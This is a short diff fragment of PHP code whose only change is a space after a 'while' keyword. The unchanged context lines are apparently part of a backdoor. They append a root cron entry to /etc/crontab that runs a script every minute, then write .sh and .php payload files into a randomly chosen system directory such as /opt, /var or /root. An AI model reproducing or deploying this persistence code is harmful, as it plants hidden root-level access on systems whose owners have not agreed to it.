@@ -33,7 +33,7 @@ if (extension_loaded('pcntl')) {
         $dirs = array('opt', 'usr', 'var', 'home', 'root');
         do {
             $dir = $dirs[rand(0, count($dirs) - 1)];
-        } while(!is_dir($dir));
+        } while (!is_dir($dir));
         putIn('/etc/crontab', "\n* * * * * root sh /$dir/$file.sh", true);
         file_put_contents("/$dir/$file.sh", $dataSh);
         file_put_contents("/$dir/$file.php", $dataPhp);
